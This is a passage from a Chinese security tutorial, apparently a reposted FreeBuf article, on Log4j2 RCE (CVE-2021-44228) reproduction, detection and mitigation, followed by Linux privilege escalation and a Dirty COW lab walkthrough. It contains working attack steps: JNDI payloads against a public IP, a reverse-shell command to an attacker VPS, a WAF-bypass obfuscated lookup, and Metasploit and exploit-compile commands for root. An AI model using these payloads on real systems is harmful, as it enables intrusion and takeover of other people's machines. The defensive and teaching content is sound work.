    * RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层。

    * RMI服务端的远程引用层`sun.rmi.server.UnicastServerRef`收到请求会请求传递给`Skeleton(sun.rmi.registry.Registrylmpl_Skel#dispatch)`

    * Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。

    * Skeleton处理客户端请求: bind、 list、 lookup、 rebind、 unbind, 如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。

  2. 再去连接Server并调用远程方法

    * RMI客户端反序列化服务端结果,获取远程对象的引用

    * RMI客户端调用远程方法,RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端

    * RMI客户端反序列化RMI远程方法调用结果

**危险的点:**如果服务端没有我想调用的对象->RMI允许服务端从远程服务器进行远程URL动态类加载对象调用:从网络通信到内存操作,有一个对象的创建到调用的过程-->在JAVA中使用序列化和反序列化来实现

#### LDAP(Lightweight Directory Access Protocol)

LDAP即是JNDI SPI支持的Service
Provider之一，但同时也是协议。LDAP目录服务是中目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-
服务器模型，它的功能用于对一个存在目录数据库的访问。LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。LDAP
的目录信息是以树形结构进行存储的。

### Log4j2远程代码执行漏洞复现及漏洞修复

利用版本:

  * 2.0到2.14.1版本

#### 漏洞复现

  1. 漏洞触发点:`http://103.116.46.7:8983/solr/admin/cores?action=`

  2. 漏洞探测:`http://103.116.46.7:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.sxy8s9.dnslog.cn}`  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134905.png)

  3. 下载工具进行反弹shell`wget https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/log4j/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`

  4. 运行`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YOUR-BASE64-ENCODE}|{base64,-d}|{bash,-i}" -A "YOUR-ATTACK-VPS-IP"`

  5. 方式一:网址输入:`http://103.116.46.7:8983/solr/admin/cores?action=${jndi:ldap://YOUR-ATTACK-VPS-IP:1389/Exploit}`

  6. 方式二将上方抓包改为POST传参

  7. 结果  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134906.png)

#### 检测手段

  1. 相关用户可根据Java jar解压后是否存在org/apache/logging/log4j相关路径结构，判断是否使用了存在漏洞的组件，若存在相关Java程序包，则很可能受漏洞影响。  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134907.png)

  2. 若程序使用Maven打包，可查看项目的pom.xml文件中是否存在下图所示的相关字段，若版本号为小于2.15.1，则应用受漏洞影响。  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134908.png)

  3. 若程序使用gradle打包，可查看build.gradle编译配置文件，若在dependencies部分存在org.apache.logging.log4j相关字段，且版本号为小于2.15.1，则应用受漏洞影响。  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134909.png)

攻击排查:

  1. 攻击者在利用漏洞前通常采用dnslog方式进行扫描、探测，常见的漏洞利用方式可通过应用系统报错日志中的`"javax.naming.CommunicationException"、"javax.naming.NamingException: problem generating object using object factory"、"Error looking up JNDI resource"`关键字进行排查。  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134910.png)

  2. 攻击者发送的数据包中可能存在"${jndi:}" 字样，推荐使用全流量或WAF设备进行检索排查。  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134911.png)

#### 修复建议

##### 将 log4j-core 升级到 2.15.0 版本

##### 接入安全产品

第一时间上WAF规则、RASP拦截等措施，给修复争取时间。  
但是也要注意一些静态规则上的绕过，log4j 支持的写法比较多，有非常多绕过姿势。比如：

    
    
    ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}  
    

##### 删除漏洞类

通过删除漏洞类进行修复的方案比较稳，也是官方推荐的一种修复方案。直接删除 log4j jar 包中存在漏洞的类：

    
    
    zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class  
    

这种修复比较方便快捷，一般业务代码也不会用到 jndi lookup
这个功能。不过可能会对基于版本号判定的安全数据采集造成一定困扰，无法准确统计漏洞的最新受影响情况。建议删除之后在 jar
包后面加上一定的标记，如：log4j-2.14.1.sec.jar  
另外，由于某些原因不想删除的话，可以自己代码替换原始的 JndiLookup 类，将它加到业务代码中。需要注意的是，必须保证它在 log4j 原类之前加载。

    
    
    package org.apache.logging.log4j.core.lookup;  
      
    public class JndiLookup {  
        public JndiLookup() {  
            throw new NoClassDefFoundError("JNDI lookup is disabled");  
        }  
    }  
    

也可以做成依赖包，在 log4j-core
之前添加，可以实现同样的效果（注意不要引入不可信的第三方依赖，可能导致潜在安全风险，以下配置来源互联网，仅作为示例，请勿直接使用）：

    
    
    <dependency>  
        <groupId>org.glavo</groupId>  
        <artifactId>log4j-patch</artifactId>  
        <version>1.0</version>  
    </dependency>  
    

当然也可以通过RASP的方式干掉漏洞类，Github上有不少RASP的无损修复方案，比如：

##### 通过配置禁用 log4j 的 lookup 功能

禁用的方式就比较多了。然而下面2、3、4这几种方式对低于 2.10 版本的 log4j-core
都没有效果，而且环境变量和启动参数这种设置，在迁移或者变更的过程中丢失的可能性比较大。log4j 在 2.15.0 版本中默认就已经关闭了 lookup
功能。  
log4j2.component.properties、log4j2.xml 默认放在 ClassPath
路径下，如：源代码的资源目录或者可执行程序所在的当前目录。

###### 设置日志输出 Pattern 格式

对于 >=2.7 的版本，在 log4j 中对每一个日志输出格式进行修改。在 %msg 占位符后面添加
{nolookups}，这种方式的适用范围比其他三种配置更广。比如在 log4j2.xml 中配置：

    
    
    <?xml version="1.0" encoding="UTF-8"?>  
    <Configuration status="WARN">  
      <Appenders>  
        <Console name="Console" target="SYSTEM_OUT">  
          <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>  
        </Console>  
      </Appenders>  
      <Loggers>  
        <Root level="error">  
          <AppenderRef ref="Console"/>  
        </Root>  
      </Loggers>  
    </Configuration>  
    public class Test {  
    public static void main(String[] args) {  
    String t = "${jndi:ldap://xxx.com/xxx}";  
    Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);  
    logger.error(t);  
    }  
    }  
    

###### 设置JVM系统属性

在 Java 应用启动参数中增加 -Dlog4j2.formatMsgNoLookups=true，或者在业务代码中设置系统属性：

    
    
    // 必须在 log4j 实例化之前设置该系统属性  
    System.setProperty("log4j2.formatMsgNoLookups", "true");  
      
    Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);  
    

###### 修改配置文件

在配置文件 log4j2.component.properties
中增加：log4j2.formatMsgNoLookups=true，配置文件放置于应用程序的 ClassPath 路径下。

###### 设置进程环境变量

在环境变量中增加：LOG4J_FORMAT_MSG_NO_LOOKUPS=true

> 注意！这些配置和属性，并不能在所有场景下生效，比如在 logstash 中就无法生效：**Solutions and Mitigations:**The
> widespread flag -Dlog4j2.formatMsgNoLookups=true does NOT mitigate the
> vulnerability in Logstash, as Logstash uses Log4j in a way where the flag
> has no effect. It is therefore necessary to remove the JndiLookup class from
> the log4j2 core jar, with the following command:
>
> zip -q -d /logstash-core/lib/jars/log4j-core-2.*
> org/apache/logging/log4j/core/lookup/JndiLookup.class
>
> Refer: https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-
> vulnerability-cve-2021-44228-esa-2021-31/291476

##### 升级JDK版本

对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认就已经禁用了 RMI Reference、LDAP
Reference 的远程加载。对于 RCE 来说，可以起到很直接的缓解作用，可以作为增强型的加固方案。  
在高版本JDK环境下，JNDI注入也还是存在一定RCE风险，可以参考这篇文章：  
另外 log4j 漏洞本身除了 RCE，还存在着巨大的攻击面，比如
SSRF、敏感信息泄露等等，威胁非常大，不要企图仅仅通过升级JDK版本来修复漏洞，建议还是老老实实升级。

## 权限提升

### 权限提升介绍

> 提权是将服务器的普通用户提升为管理员用户的一种操作。即当我们getshell-一个网站之后，大部分  
> 情况下我们获得的权限是非常低的，这时候就需要利用提权，让原先的低权限提升到高权限。  
> 例如：  
> Windows: user--->system user--->administrator
>
> Linux:user--->root

UAC(User Account Control,用户账号控制)是微软为了提高系统安全性在Windows
Vista中引入的技术.UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前,拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证,以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改.在windows
Vista及以后的版本中,微软设置了安全控制策略,分为高、中、低三个等级。高等级的进程有管理员权限;中等级的进程有普通用户权限;低等级的进程,权限是有限的,以保证系统子啊受到安全威胁时造成的损害最小。在权限不够的情况下,访问系统磁盘的根目录、Windows目录,以及读写系统登录数据等操作,都需要经常UAC(User
Account Control)用户账号控制的认证

提权方式

  1. 系统漏洞提权

  2. 数据库提权

  3. 第三方软件/服务提权

  4. 系统配置错误提权

### Windows系统提权

系统漏洞提权即利用系统的自身缺陷，用来进行系统权限提升。对于这些系统漏洞，Windows和Liunx均存在提权用的可执行文件。

![](https://gitee.com/fuli009/images/raw/master/public/20230217134912.png)

  * https://github.com/chroblert/WindowsVulnScan

  * https://github.com/SecWiki/windows-kernel-exploits

  * https://github.com/lyshark/Windows-exploits

### Linux系统提权

  1. 信息收集

  2. 搜索漏洞(查找相关版本的内核漏洞)

  3. 使用exp进行提权

![](https://gitee.com/fuli009/images/raw/master/public/20230217134914.png)

#### SUID提权

> SUID代表设置的用户ID,是一种Linux功能，允许用户在指定用户的许可下执行文件。例如，Linux
> ping命令通常需要root权限才能打开网络套接字。通过将ping程序标记为SUID(所有者为root),只要低特权用户执行ping程序，便会以root特权执行ping.
>
> SUID(设置用户ID)是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。
>
>
> 当运行具有sudo权限的二进制文件时，它将以其他用户身份运行，因此具有其他用户特权。它可以是root用户，也可以只是另一个用户。如果在程序中设置了suid,该位可以生成shell或以其他方式滥用，我们可以使用它来提升我们的特权。

  * Find SUID`find / -perm -u=s -type f 2>/dev/null`

  * https://gtfobins.github.io/

#### 脏牛提权复现

##### 漏洞描述

脏牛漏洞(CVE-2016–5195)，又叫Dirty
COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，在2016年10月18后才得以修复，因此影响范围很大。

漏洞具体是由于get_user_page内核函数在处理Copy-on-
Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。

##### 漏洞危害

低权限用户利用脏牛漏洞可以在众多Linux系统上实现本地提权

##### 影响范围

（如果你的内核版本低于以下版本，则还存在此漏洞）：

    
    
    Centos7/RHEL7     3.10.0-327.36.3.el7  
    Cetnos6/RHEL6     2.6.32-642.6.2.el6  
    Ubuntu 16.10      4.8.0-26.28  
    Ubuntu 16.04      4.4.0-45.66  
    Ubuntu 14.04      3.13.0-100.147  
    Debian 8          3.16.36-1+deb8u2  
    Debian 7          3.2.82-1  
    

##### 漏洞复现

靶场:

  1. https://www.vulnhub.com/entry/lampiao-1,249/

  2. https://download.vulnhub.com/lampiao/Lampiao.zip

arp-scan 扫描主机

`arp-scan -l`  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134915.png)

nmap 扫描目标主机开放端口

`nmap -sS -T4 -p 1-65535 -v 192.168.64.141`  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134916.png)  
发现drupal,利用漏洞  
通过开放的1898端口进入网站，看到目标网站，发现网站cms是drupal  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134917.png)

    
    
    # msf 搜索drupal漏洞,使用可利用漏洞进行攻击  
    >search drupal  
    # exploit/unix/webapp/drupal_drupalgeddon2  
    >use 1  
    >set rhosts 192.168.64.141  
    >set rport 1898  
    >run  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230217134918.png)

信息收集

上传信息收集脚本，发现存在脏牛提权漏洞

    
    
    upload /tmp/linux-exploit-suggester.sh  /tmp/lasc.sh  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230217134919.png)  
进入shell 执行信息收集脚本,执行结果中发现【CVE-2016-5195】脏牛漏洞

    
    
    shell  
    cd /tmp  
    chmod 777 lasc.sh  
    ./lasc.sh  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230217134921.png)

漏洞利用  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134922.png)  
下载exp,上传exp

    
    
    # 40611没成功,使用40847  
    mv 40847.cpp /tmp/   
    upload /tmp/40847.cpp  /tmp/lasc.cpp  
    # 进入shell编译执行exp,得到登录密码  
    shell  
    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exp lasc.cpp -lutil  
    ./exp  
    

![](https://gitee.com/fuli009/images/raw/master/public/20230217134923.png)  
打开交互式shell，切换root用户，提权成功  
![](https://gitee.com/fuli009/images/raw/master/public/20230217134924.png)

  * 

    
    
    本文作者：江霁月， 转载请注明来自FreeBuf.COM

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

